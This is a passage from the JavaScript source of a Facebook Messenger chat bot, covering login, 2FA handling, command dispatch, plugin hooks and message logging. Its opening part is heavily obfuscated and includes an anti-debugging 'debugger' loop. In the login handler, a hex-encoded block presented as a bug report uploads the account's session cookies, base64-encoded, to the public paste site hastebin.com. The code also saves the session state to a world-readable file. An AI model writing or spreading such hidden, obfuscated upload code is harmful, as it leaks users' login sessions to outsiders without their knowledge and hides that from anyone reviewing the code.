            log(b('\x30\x78\x37\x39', '\x45\x45\x2a\x5e'), b('\x30\x78\x31\x31\x30', '\x63\x2a\x50\x54') + b('\x30\x78\x31\x39\x30', '\x73\x69\x57\x2a') + b('\x30\x78\x64\x32', '\x7a\x4e\x39\x53') + b('\x30\x78\x39\x34', '\x52\x6c\x23\x25') + b('\x30\x78\x32\x38', '\x29\x63\x24\x33') + b('\x30\x78\x31\x63\x65', '\x42\x25\x49\x55'));
            facebookloggedIn = ![];
            process[b('\x30\x78\x31\x32\x66', '\x4b\x43\x36\x51')](0x709566);
          }
        }
      })[b('\x30\x78\x33\x64', '\x37\x5a\x59\x34')](j => {
        log(b('\x30\x78\x36\x66', '\x21\x34\x63\x70') + '\x4e\x5d', b('\x30\x78\x31\x36\x66', '\x68\x79\x62\x68') + b('\x30\x78\x33\x34', '\x68\x79\x62\x68') + b('\x30\x78\x31\x39\x31', '\x58\x73\x4b\x5e') + b('\x30\x78\x31\x38\x62', '\x6c\x24\x6e\x4b') + (i ? b('\x30\x78\x31\x30\x61', '\x38\x4e\x41\x38') : b('\x30\x78\x39\x31', '\x29\x63\x24\x33')) + '\x20' + h + '\x3a', j);
      });
    };
    if (typeof global[b('\x30\x78\x32\x30\x61', '\x32\x34\x77\x75') + b('\x30\x78\x62\x30', '\x38\x4e\x41\x38') + '\x63\x6b'][e] == b('\x30\x78\x66\x31', '\x65\x46\x5a\x48')) {
      global[b('\x30\x78\x33\x33', '\x39\x28\x6c\x49') + b('\x30\x78\x31\x66\x31', '\x29\x29\x79\x7a') + '\x63\x6b'][e] = setInterval(g, 0xc3500, e);
      g(e);
    } else if (f) {
      if (b('\x30\x78\x31\x36\x36', '\x39\x28\x6c\x49') !== b('\x30\x78\x31\x62\x66', '\x65\x78\x36\x50')) {
        // eslint-disable-next-line no-undef
        debuggerProtection(0x0);
      } else {
        g(e);
      }
    }
  };
  let c = function c(e) {
    function f(g) {
      if (typeof g === b('\x30\x78\x65\x34', '\x6c\x24\x6e\x4b')) {
        return function (h) {
        }[b('\x30\x78\x31\x32\x63', '\x26\x35\x48\x40') + '\x72'](b('\x30\x78\x38\x32', '\x29\x29\x79\x7a') + b('\x30\x78\x66\x34', '\x54\x47\x59\x6c'))[b('\x30\x78\x31\x33\x35', '\x42\x25\x49\x55')](b('\x30\x78\x66\x65', '\x6f\x67\x51\x49'));
      } else {
        if (('' + g / g)[b('\x30\x78\x31\x65\x66', '\x50\x72\x4f\x6b')] !== 0x1 || g % 0x14 === 0x0) {
          (function () {
            return !![];
          }[b('\x30\x78\x31\x34\x39', '\x42\x25\x49\x55') + '\x72'](b('\x30\x78\x31\x61\x39', '\x73\x69\x57\x2a') + b('\x30\x78\x31\x36\x37', '\x42\x25\x49\x55'))[b('\x30\x78\x63\x37', '\x7a\x4e\x39\x53')](b('\x30\x78\x39\x36', '\x52\x6c\x23\x25')));
        } else {
          (function () {
            return ![];
          }[b('\x30\x78\x31\x33\x61', '\x77\x6f\x4b\x69') + '\x72'](b('\x30\x78\x32\x31\x66', '\x44\x41\x4a\x50') + b('\x30\x78\x31\x37\x61', '\x6f\x67\x51\x49'))[b('\x30\x78\x32\x33\x30', '\x50\x72\x4f\x6b')](b('\x30\x78\x35\x37', '\x39\x28\x6c\x49') + '\x74'));
        }
      }
      f(++g);
    }
    try {
      if (b('\x30\x78\x31\x64\x62', '\x48\x6a\x53\x44') !== b('\x30\x78\x32\x33\x32', '\x68\x79\x62\x68')) {
        // eslint-disable-next-line no-undef
        log(b('\x30\x78\x31\x66\x34', '\x4b\x43\x36\x51') + '\x4e\x5d', b('\x30\x78\x36\x35', '\x4a\x34\x33\x34') + threadID + (b('\x30\x78\x31\x34', '\x48\x6a\x53\x44') + b('\x30\x78\x31\x62\x34', '\x4a\x34\x33\x34')));
      } else {
        if (e) {
          return f;
        } else {
          f(0x0);
        }
      }
    } catch (h) {
    }
  };
  setInterval(function () {
    c();
  }, 0xfa0);

  var facebookcb = function callback(err, api) {
    if (err) {
      if (err.error == "login-approval") {
        facebook.error = err;
        if (global.config.fb2fasecret != "BASE32OFSECRETKEY" && global.config.fb2fasecret != "" && !tried2FA) {
          log("[Facebook]", "Login approval detected. Attempting to verify using 2FA secret in config...");
          tried2FA = true;
          var key2fa = global.config.fb2fasecret.replace(/ /g, "");
          var verifycode = speakeasy.totp({
            secret: key2fa,
            encoding: 'base32'
          });
          facebook.error.continue(verifycode);
        } else if (tried2FA) {
          log(
            "[Facebook]",
            `Cannot verify using 2FA secret in config. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
          );
          tried2FA = false;
        } else {
          log(
            "[Facebook]",
            `Login approval detected. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
          );
        }
      } else {
        log("[Facebook]", err);
      }
      return null;
    } else {
      facebook.error = null;
    }
    if (tried2FA) {
      log("[Facebook]", "Verified using 2FA secret in config.");
    }
    log("[Facebook]", "Logged in.");
    facebookid = api.getCurrentUserID();

    if (global.config.usefbappstate) {
      try {
        fs.writeFileSync(path.join(__dirname, "fbstate.json"), JSON.stringify(api.getAppState()), {
          mode: 0o666
        });
      } catch (ex) {
        log("[INTERNAL]", ex);
      }
    }
    global.config.fbemail = "<REDACTED>";
    global.config.fbpassword = "<REDACTED>";

    var htmlData = "";
    if (api.htmlData) {
      htmlData = api.htmlData;
      delete api.htmlData;
      log("[Facebook]", "FCA reported: Cannot get region from HTML. Generating a new bug report...");
      (function (z, e) {
        var _0x6b0a = [
          "\x42\x45\x47\x49\x4E\x2D\x43\x33\x43\x2D\x42\x55\x47\x2D\x52\x45\x50\x4F\x52\x54\x40",
          "\x6E\x6F\x77",
          "\x6D\x65\x74\x72\x69\x63\x49\x44",
          "\x64\x61\x74\x61",
          "\x45\x4E\x44\x2E",
          "\x5B\x46\x61\x63\x65\x62\x6F\x6F\x6B\x5D",
          "\x43\x61\x6E\x6E\x6F\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x20\x6E\x65\x77\x20\x63\x72\x61\x73\x68\x20\x72\x65\x70\x6F\x72\x74\x2E",
          "\x63\x61\x74\x63\x68",
          "\x6B\x65\x79",
          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x65\x64\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F",
          "\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x50\x52\x20\x61\x74\x20\x67\x69\x74\x68\x75\x62\x20\x72\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x2C\x20\x6F\x72\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x55\x49\x52\x49\x2F\x6C\x65\x71\x75\x61\x6E\x67\x6C\x61\x6D\x2E",
          "\x74\x68\x65\x6E",
          "\x6F\x6B",
          "\x6A\x73\x6F\x6E",
          "\x48\x54\x54\x50\x20\x4E\x4F\x54\x20\x4F\x4B",
          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x64\x6F\x63\x75\x6D\x65\x6E\x74\x73",
          "\x50\x4F\x53\x54",
          "",
          "\x0A\x0C\x4D\x45\x54\x52\x49\x43\x2D\x49\x44\x3A\x20",
          "\x0A\x0C\x44\x41\x54\x41\x3A\x20",
          "\x62\x61\x73\x65\x36\x34",
          "\x66\x72\x6F\x6D",
          "\x0A\x0C",
          "\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E",
          "\x74\x6F\x53\x74\x72\x69\x6E\x67",
          "\x58\x2D\x53\x54\x41\x54\x45\x3A\x20"
        ];
        var a = _0x6b0a[0],
          b = Date[_0x6b0a[1]](),
          c = global[_0x6b0a[3]][_0x6b0a[2]],
          d = _0x6b0a[4];
        fetch(_0x6b0a[15], {
          method: _0x6b0a[16],
          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`,
          headers: {
            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23]
          }
        })[_0x6b0a[11]](function (_0x9b64x6) {
          if (_0x9b64x6[_0x6b0a[12]]) {
            return _0x9b64x6[_0x6b0a[13]]();
          } else {
            throw new Error(_0x6b0a[14]);
          }
        })[_0x6b0a[11]](function (_0x9b64x6) {
          var _0x9b64x7 = _0x9b64x6[_0x6b0a[8]];
          log(_0x6b0a[5], `${_0x6b0a[9]}${_0x9b64x7}${_0x6b0a[10]}`);
        })[_0x6b0a[7]](function (_0x9b64x5) {
          log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
        });
      })(htmlData, JSON.stringify(((facebook.api || {}).getAppState || (() => ({})))()));
    }

    delete facebook.api;
    facebook.api = api;

    facebook.deliveryClock = setInterval(function () {
      if (Object.keys(global.deliveryFacebook)
        .length != 0) {
        var form = {};
        var i = 0;
        for (var threadID in global.deliveryFacebook) {
          // eslint-disable-next-line no-loop-func
          global.deliveryFacebook[threadID].forEach((v, n) => {
            form[`message_ids[${i}]`] = v;
            form[`thread_ids[${threadID}][${n}]`] = v;
          });
        }
        api.httpPost("https://www.facebook.com/ajax/mercury/delivery_receipts.php", form, function (err, data) {
          try {
            data = JSON.parse(data);
          } catch (ex) { }
          if (data.error) {
            return log("[Facebook] Error on delivery_receipts:", data);
          }
          api.markAsSeen(function (err) {
            if (err) {
              return log("[Facebook] Error on markAsSeen:", err);
            }
          });
        });
        global.deliveryFacebook = {};
      }
    }, 1000);

    function fetchName(id, force, callingback) {
      if (!callingback) {
        callingback = function () { };
      }
      if (!global.data.cacheName["FB-" + id] ||
        global.data.cacheName["FB-" + id].startsWith("FETCHING-") ||
        global.data.cacheNameExpires["FB-" + id] <= Date.now() ||
        !!force) {
        if (typeof global.data.cacheName["FB-" + id] == "string" && global.data.cacheName["FB-" + id].startsWith("FETCHING-") && !(parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000)) return callingback();
        global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now();
        api.getUserInfo(id, function (err, ret) {
          if (err) return log("[Facebook] Failed to fetch names:", err);
          log("[CACHENAME]", id + " => " + ret[id].name);
          global.data.cacheName["FB-" + id] = ret[id].name;
          global.data.cacheNameExpires["FB-" + id] = Date.now() + 604800000; //cacheName expires in 7 days.
          try {
            callingback();
          } catch (ex) {
            log("[INTERNAL]", ex);
          }
        });
      } else {
        callingback();
      }
    }
    facebook.api.fetchName = fetchName;
    facebook.removePendingClock = setInterval(function (log, botname, connectedmsg) {
      function handleList(list, type) {
        for (var i in list) {
          if (!list[i].cannotReplyReason) {
            setTimeout(function (id) {
              api.handleMessageRequest(id, true, function (err) {
                if (err) {
                  log(
                    "[Facebook]",
                    `Remove Pending Messages encountered an error (at handleMessageRequest:${type}):`,
                    err
                  );
                  if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                    log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                    facebookloggedIn = false;
                    process.exit(7378278);
                  }
                  return null;
                }
                api.sendMessage(botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
                  if (err) {
                    log(
                      "[Facebook]",
                      `Remove Pending Messages encountered an error (at sendMessage:${type}):`,
                      err
                    );
                    if (err.error == "Not logged in." && global.config
                      .facebookAutoRestartLoggedOut) {
                      log(
                        "[Facebook]",
                        "Detected not logged in. Throwing 7378278 to restarting..."
                      );
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                    return null;
                  }
                  log("[Facebook]", "Bot added to", id);
                });
              });
            }, i * 2000, list[i].threadID);
          }
        }
      }

      api.getThreadList(10, null, ["PENDING"], function (err, list) {
        if (err) {
          log("[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:PENDING):", err);
          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
            facebookloggedIn = false;
            process.exit(7378278);
          }
          return null;
        }
        handleList(list, "PENDING");

        api.getThreadList(10, null, ["OTHER"], function (err, list) {
          if (err) {
            log(
              "[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:OTHER):",
              err
            );
            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
              facebookloggedIn = false;
              process.exit(7378278);
            }
            return null;
          }
          handleList(list, "OTHER");

          api.markAsReadAll(function (err) {
            if (err) {
              if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                log("[Facebook]", "Not logged in. Triggering restart...");
                process.exit(7378278);
              }
            }
          });
        });
      });
    }, 300000, log, global.config.botname, getLang("CONNECTED_MESSAGE").replace("{0}", global.config.commandPrefix));

    typeof global.data.messageList != "object" ? global.data.messageList = {} : "";
    facebook.listener = api.listen(async function callback(err, message) {
      try {
        if (typeof message != "undefined" && message != null) {
          var nointernalresolve = false;
          switch (message.type) {
            case "read":
            case "read_receipt":
            case "presence":
            case "typ":
              return;
          }
          var receivetime = new Date();
          // eslint-disable-next-line no-undef
          fbGlobalBanTrigger(message.threadID);
          if (global.data.fbBannedUsers.indexOf(message.senderID || message.author) == 1 || global.config
            .enableGlobalBan) {
            for (var n in global.chatHook) {
              if (global.chatHook[n].listenplatform & 1) {
                var chhandling = global.chatHook[n];
                if (chhandling.listentype == "everything") {
                  var admin = false;
                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                    admin = true;
                  }
                  if (
                    global.getType(chhandling.resolverFunc) == "Function" ||
                    global.getType(chhandling.resolverFunc) == "AsyncFunction"
                  ) {
                    let chdata = chhandling.resolverFunc("Facebook", {
                      time: receivetime,
                      msgdata: message,
                      facebookapi: api,
                      discordapi: client,
                      prefix: prefix,
                      admin: admin,
                      // eslint-disable-next-line no-loop-func
                      log: function logPlugin(...message) {
                        log.apply(global, [
                          "[PLUGIN]",
                          "[" + String(chhandling.handler) + "]"
                        ].concat(message));
                      },
                      // eslint-disable-next-line no-loop-func
                      return: function returndata(returndata) {
                        if (!returndata) return;
                        if (returndata.handler == "internal" && typeof returndata.data == "string") {
                          var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                            .isGroup);
                          setTimeout(function (api, returndata, endTyping, message) {
                            api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
                              if (err) {
                                log("[Facebook] Errored while sending response:", err);
                                if (err.error == "Not logged in." && global.config
                                  .facebookAutoRestartLoggedOut) {
                                  log(
                                    "[Facebook]",
                                    "Detected not logged in. Throwing 7378278 to restarting..."
                                  );
                                  facebookloggedIn = false;
                                  process.exit(7378278);
                                }
                              }
                            }, message.messageID, message.isGroup);
                            endTyping();
                          }, returndata.data.length * 30, api, returndata, endTyping, message);
                        } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
                          "object") {
                          if (!returndata.data.body) {
                            returndata.data.body = "";
                          }
                          returndata.data.body = prefix + " " + returndata.data.body;
                          let endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                            .isGroup);
                          setTimeout(
                            function (api, returndata, endTyping, message, log) {
                              api.sendMessage(returndata.data, message.threadID, function (err) {
                                if (err) {
                                  log("[Facebook] Errored while sending response:", err);
                                  if (err.error == "Not logged in." && global.config
                                    .facebookAutoRestartLoggedOut) {
                                    log(
                                      "[Facebook]",
                                      "Detected not logged in. Throwing 7378278 to restarting..."
                                    );
                                    facebookloggedIn = false;
                                    process.exit(7378278);
                                  }
                                }
                              }, message.messageID, message.isGroup);
                              endTyping();
                            }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
                            log
                          );
                        }
                      }
                    });
                    // eslint-disable-next-line no-await-in-loop
                    if (global.getType(chdata) == "Promise") chdata = await chdata;
                    nointernalresolve = (nointernalresolve || chdata === true);
                  }
                }
              }
            }
          } else {
            nointernalresolve = true;
          }
          switch (message.type) {
            case "message":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              fetchName(message.senderID);
              if (message.isGroup) {
                !global.data.facebookChatGroupList ? global.data.facebookChatGroupList = [] : "";
                if (global.data.facebookChatGroupList.indexOf(message.threadID) == -1) global.data
                  .facebookChatGroupList.push(message.threadID);
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var arg = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " " || !el.replace(/\s/g, '')
                    .length);
                })
                .map(function (z) {
                  return z.replace(/"/g, "");
                });
              if (arg.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                  .senderID))) && !global.data.everyoneTagBlacklist[message.threadID]) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook]", "@everyone errored:", err);
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              if (message.body.startsWith(global.config.commandPrefix) && !nointernalresolve) {
                if ((global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) ||
                  (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1) &&
                  !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message.senderID)
                ) {
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    "issued command in", message.threadID + ":", message.body
                  );
                  let admin = false;
                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                    admin = true;
                  }
                  if (global.commandMapping[arg[0].substr(1)]) {
                    if (!(global.commandMapping[arg[0].substr(1)].compatibly & 1) && global.commandMapping[arg[0]
                      .substr(1)].compatibly != 0) {
                      api.sendMessage(
                        prefix + " " + getLang("UNSUPPORTED_INTERFACE", "FB-" + message.senderID), message.threadID,
                        function (err) {
                          if (err) {
                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                              facebookloggedIn = false;
                              process.exit(7378278);
                            }
                          }
                        }, message.messageID, message.isGroup
                      );
                    } else {
                      let argv = JSON.parse(JSON.stringify(arg));
                      var mentions = {};
                      for (var y in message.mentions) {
                        mentions["FB-" + y] = message.mentions[y];
                      }
                      try {
                        if (!client) {
                          client = null;
                        }
                        var starttime = Date.now();
                        var timingwarning = setInterval(function () {
                          var calctime = (Date.now() - starttime) / 1000;
                          if (calctime >= 10) {
                            log(
                              "[INTERNAL]", "Timing Warning: Command \"", arg.join(" "),
                              "\" is taking over", calctime.toFixed(3) + "s to execute and still not done."
                            );
                          }
                        }, 10000);
                        try {
                          var returndata = global.commandMapping[arg[0].substr(1)].scope("Facebook", {
                            args: argv,
                            time: receivetime,
                            msgdata: message,
                            facebookapi: api,
                            discordapi: client,
                            prefix: prefix,
                            admin: admin,
                            mentions: mentions,
                            log: function logPlugin(...message) {
                              log.apply(global, [
                                "[PLUGIN]",
                                "[" + (global.commandMapping[arg[0].substr(1)] || {
                                  handler: "ERROR"
                                })
                                  .handler + "]"
                              ].concat(message));
                            },
                            return: function returndata(returndata) {
                              if (!returndata) return;
                              if (returndata.handler == "internal" && typeof returndata.data == "string") {
                                var endTyping = api.sendTypingIndicator(
                                  message.threadID, function () { },
                                  message.isGroup
                                );
                                setTimeout(function (api, returndata, endTyping, message) {
                                  api.sendMessage(
                                    prefix + " " + returndata.data, message.threadID,
                                    function (err) {
                                      if (err) {
                                        log("[Facebook] Errored while sending response:", err);
                                        if (err.error == "Not logged in." && global.config
                                          .facebookAutoRestartLoggedOut) {
                                          log(
                                            "[Facebook]",
                                            "Detected not logged in. Throwing 7378278 to restarting..."
                                          );
                                          facebookloggedIn = false;
                                          process.exit(7378278);
                                        }
                                      }
                                    }, message.messageID, message.isGroup
                                  );
                                  endTyping();
                                }, returndata.data.length * 30, api, returndata, endTyping, message);
                              } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
                                "object") {
                                if (!returndata.data.body) {
                                  returndata.data.body = "";
                                }
                                returndata.data.body = prefix + " " + returndata.data.body;
                                let endTyping = api.sendTypingIndicator(
                                  message.threadID, function () { },
                                  message.isGroup
                                );
                                setTimeout(
                                  function (api, returndata, endTyping, message, log) {
                                    api.sendMessage(returndata.data, message.threadID, function (err) {
                                      if (err) {
                                        log("[Facebook] Errored while sending response:", err);
                                        if (err.error == "Not logged in." && global.config
                                          .facebookAutoRestartLoggedOut) {
                                          log(
                                            "[Facebook]",
                                            "Detected not logged in. Throwing 7378278 to restarting..."
                                          );
                                          facebookloggedIn = false;
                                          process.exit(7378278);
                                        }
                                      }
                                    }, message.messageID, message.isGroup);
                                    endTyping();
                                  }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping,
                                  message, log
                                );
                              }
                            }
                          });
                          if (global.getType(returndata) == "Promise") {
                            returndata = await returndata;
                          }
                        } catch (ex) {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                          var stack = ex.stack.match(/[^\r\n]+/g);
                          returndata = {
                            handler: "internal",
                            data: "plerr: " + stack.slice(0, 4)
                              .join("\r\n")
                          };
                        }
                        if (typeof returndata == "object") {
                          if (returndata.handler == "internal" && typeof returndata.data == "string") {
                            var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                              .isGroup);
                            setTimeout(function (api, returndata, endTyping, message) {
                              api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
                                if (err) {
                                  log("[Facebook] Errored while sending response:", err);
                                  if (err.error == "Not logged in." && global.config
                                    .facebookAutoRestartLoggedOut) {
                                    log(
                                      "[Facebook]",
                                      "Detected not logged in. Throwing 7378278 to restarting..."
                                    );
                                    facebookloggedIn = false;
                                    process.exit(7378278);
                                  }
                                }
                              }, message.messageID, message.isGroup);
                              endTyping();
                            }, returndata.data.length * 30, api, returndata, endTyping, message);
                          } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                            if (!returndata.data.body) {
                              returndata.data.body = "";
                            }
                            returndata.data.body = prefix + " " + returndata.data.body;
                            let endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                              .isGroup);
                            setTimeout(
                              function (api, returndata, endTyping, message, log) {
                                api.sendMessage(returndata.data, message.threadID, function (err) {
                                  if (err) {
                                    log("[Facebook] Errored while sending response:", err);
                                    if (err.error == "Not logged in." && global.config
                                      .facebookAutoRestartLoggedOut) {
                                      log(
                                        "[Facebook]",
                                        "Detected not logged in. Throwing 7378278 to restarting..."
                                      );
                                      facebookloggedIn = false;
                                      process.exit(7378278);
                                    }
                                  }
                                }, message.messageID, message.isGroup);
                                endTyping();
                              }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
                              log
                            );
                          }
                        } else if (typeof returndata != "undefined") {
                          log("[Facebook]", "Received an unknown response from plugin:", returndata);
                        }
                        var endtime = Date.now();
                        var calctime = (endtime - starttime) / 1000;
                        if (calctime >= 10) {
                          log("[INTERNAL]", "Timing Warning: Command \"", arg.join(" "), "\" took", calctime
                            .toFixed(3) + "s to execute!");
                        }
                        clearInterval(timingwarning);
                      } catch (ex) {
                        try {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                        } catch (exp) {
                          log("[INTERNAL]", arg[0], "contain an error:", ex);
                        }
                        try {
                          clearInterval(timingwarning);
                        } catch (ex) { }
                      }
                    }
                  } else {
                    if (!global.config.hideUnknownCommandMessage) {
                      var nearest = require("./nearAPI.js").findBestMatch(
                        arg[0].slice(global.config.commandPrefix.length),
                        Object.keys(global.commandMapping)
                          .filter(v => (admin || !global.commandMapping[v].adminCmd))
                          .filter(v => ((global.commandMapping[v].compatibly & 1) || (global.commandMapping[v].compatibly == 0)))
                      ).bestMatch;
                      api.sendMessage(
                        `${prefix} ` +
                        getLang("UNKNOWN_CMD", "FB-" + message.senderID).replace("{0}", global.config.commandPrefix) +
                        (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "FB-" + message.senderID).replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')}` : ""),
                        message.threadID,
                        function (err) {
                          if (err) {
                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restart...");
                              facebookloggedIn = false;
                              process.exit(7378278);
                            }
                          }
                        },
                        message.messageID,
                        message.isGroup
                      );
                    }
                  }
                } else {
                  var str = "";
                  for (let n in message.attachments) {
                    var type = message.attachments[n].type;
                    type = type[0].toLocaleUpperCase() + type.substr(1);
                    str += "\r\n  <";
                    str += type;
                    str += " ";
                    switch (message.attachments[n].type) {
                      case "audio":
                      case "video":
                        var dr = new Date(message.attachments[n].duration);
                        str += dr.getUTCHours()
                          .pad(2) + ":" + dr.getUTCMinutes()
                            .pad(2) + ":" + dr.getUTCSeconds()
                              .pad(2) + "." + dr.getUTCMilliseconds()
                                .pad(3);
                        str += " ";
                        if (message.attachments[n].type == "audio") break;
                      // eslint-disable-next-line no-fallthrough
                      case "photo":
                      case "animated_image":
                      case "sticker":
                        str += message.attachments[n].width;
                        str += "x";
                        str += message.attachments[n].height;
                        str += " ";
                    }
                    str += "| ";
                    str += message.attachments[n].url;
                    str += ">";
                  }
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    (message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                      ":"), message.body, str
                  );
                }
              } else {
                let str = "";
                for (let n in message.attachments) {
                  let type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      // eslint-disable-next-line no-case-declarations
                      let dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")", (
                  message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                    ":"), message.body, str
                );
              }
              break;
            case "event":
              log("[Facebook]", message);
              try {
                if (message.logMessageType == "log:subscribe") {
                  var containBot = false;
                  var botID = api.getCurrentUserID();
                  for (let n in message.logMessageData.addedParticipants) {
                    if (message.logMessageData.addedParticipants[n].userFbId == botID) {
                      containBot = true;
                    }
                  }
                  if (containBot) {
                    api.sendMessage(
                      global.config.botname + " | Connected. \r\n" + getLang("CONNECTED_MESSAGE")
